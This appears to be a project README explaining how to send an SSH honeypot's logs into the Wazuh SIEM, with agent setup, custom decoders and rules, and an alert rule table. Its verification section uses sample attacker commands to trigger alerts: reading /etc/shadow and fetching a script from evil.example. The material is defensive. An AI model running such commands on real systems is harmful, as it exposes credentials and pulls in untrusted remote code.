# Wazuh Integration Guide

Complete step-by-step guide for integrating the SSH Honeypot with Wazuh SIEM.

---

## Architecture Overview

```
┌──────────────────────────────────────────────┐
│              SSH Honeypot Host               │
│                                              │
│  ┌─────────────┐     ┌────────────────────┐  │
│  │  Honeypot   │────▶│  logs/             │  │
│  │  (Python)   │     │  ├─ funnel.log     │  │
│  └─────────────┘     │  ├─ cmd_audits.log │  │
│                       │  ├─ threats.log   │  │
│  ┌─────────────┐     │  └─ system.log    │  │
│  │ Wazuh Agent │◀────┤                    │  │
│  └──────┬──────┘     └────────────────────┘  │
│         │ encrypted TLS                       │
└─────────┼────────────────────────────────────┘
          │
          ▼
┌─────────────────────┐
│   Wazuh Manager     │
│  ┌───────────────┐  │
│  │ decoders.xml  │  │
│  │ rules.xml     │  │
│  └───────────────┘  │
│         │            │
│         ▼            │
│  ┌───────────────┐  │
│  │  Wazuh Dash-  │  │
│  │  board / Elk  │  │
│  └───────────────┘  │
└─────────────────────┘
```

---

## Step 1 – Deploy the Honeypot

```bash
# Clone / copy the project to the honeypot host
cd /opt
git clone <repo> honeypot
cd honeypot

pip install -r requirements.txt
python main.py --open --port 2222
```

Or with Docker:

```bash
docker compose up -d
```

Verify logs are being written:

```bash
tail -f logs/funnel.log logs/threats.log
```

---

## Step 2 – Install Wazuh Agent on the Honeypot Host

Follow the [official Wazuh agent install guide](https://documentation.wazuh.com/current/installation-guide/wazuh-agent/).

Quick Ubuntu install:

```bash
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -
echo "deb https://packages.wazuh.com/4.x/apt/ stable main" \
  | tee /etc/apt/sources.list.d/wazuh.list
apt-get update && apt-get install -y wazuh-agent
```

---

## Step 3 – Configure the Wazuh Agent

Edit `/var/ossec/etc/ossec.conf` **or** replace it with the provided template:

```bash
# Replace WAZUH_MANAGER_IP before copying!
sed 's/WAZUH_MANAGER_IP/192.168.1.10/g' \
  /opt/honeypot/wazuh/ossec.conf \
  > /var/ossec/etc/ossec.conf
```

The key `<localfile>` blocks tell the agent to monitor all four log files:

```xml
<localfile>
  <log_format>json</log_format>
  <location>/opt/honeypot/logs/funnel.log</location>
</localfile>
<!-- ... repeat for cmd_audits.log, threats.log, system.log -->
```

Restart the agent:

```bash
systemctl restart wazuh-agent
systemctl enable wazuh-agent
```

---

## Step 4 – Deploy Custom Decoders (on the Wazuh Manager)

```bash
# On the Wazuh Manager host:
cp /path/to/honeypot/wazuh/decoders.xml \
   /var/ossec/etc/decoders/honeypot_decoders.xml

# Verify syntax
/var/ossec/bin/wazuh-logtest -t
```

---

## Step 5 – Deploy Custom Rules (on the Wazuh Manager)

```bash
cp /path/to/honeypot/wazuh/rules.xml \
   /var/ossec/etc/rules/honeypot_rules.xml

# Verify syntax
/var/ossec/bin/wazuh-logtest -t
```

Restart the manager:

```bash
systemctl restart wazuh-manager
```

---

## Step 6 – (Optional) Real-Time Syslog Alerts

For sub-second alerting you can pipe events directly to the Wazuh manager
via UDP syslog without waiting for the agent to ship the log file:

```bash
# Start honeypot with real-time Wazuh forwarding
python main.py --open --wazuh-host 192.168.1.10 --wazuh-port 514 --wazuh-proto udp
```

On the Wazuh manager, add a syslog listener to `ossec.conf`:

```xml
<remote>
  <connection>syslog</connection>
  <port>514</port>
  <protocol>udp</protocol>
  <allowed-ips>HONEYPOT_IP</allowed-ips>
</remote>
```

---

## Alert Rule Summary

| Rule ID | Level | Event |
|---------|-------|-------|
| 100100  | 3     | New connection |
| 100110  | 5     | Auth attempt |
| 100111  | 10    | Brute-force (5+ attempts/60 s) |
| 100112  | 12    | High-rate brute-force (20+/60 s) |
| 100113  | 10    | Successful login |
| 100120  | 5     | Command executed |
| 100130  | 7     | Recon command |
| 100131  | 10    | Privilege escalation |
| 100132  | 12    | Exfiltration command |
| 100133  | 12    | Persistence mechanism |
| 100134  | 10    | Credential harvesting |
| 100135  | 15    | Malware / C2 tool |
| 100140  | 7     | Sensitive file accessed |
| 100150  | 12    | Root shell obtained |
| 100160  | 10    | Remote file download |

---

## Verifying the Integration

Send a test event:

```bash
ssh -p 2222 admin@localhost   # triggers rule 100110
cat /etc/shadow               # triggers rule 100134 + 100140
wget http://evil.example/payload.sh  # triggers rule 100160
```

Check Wazuh dashboard → **Security Events** → filter `rule.id: 1001*`

Or on the manager CLI:

```bash
tail -f /var/ossec/logs/alerts/alerts.json | python3 -m json.tool | grep honeypot
```

---

## Troubleshooting

| Symptom | Fix |
|---------|-----|
| No alerts in Wazuh | Check agent is running: `systemctl status wazuh-agent` |
| Decoder not matching | Run `/var/ossec/bin/wazuh-logtest` and paste a log line |
| Rules not firing | Verify rule file path: `/var/ossec/etc/rules/honeypot_rules.xml` |
| Log files empty | Check honeypot is running and `logs/` dir is writable |
| Port 514 blocked | Use `--wazuh-proto tcp` or open UDP 514 on manager firewall |
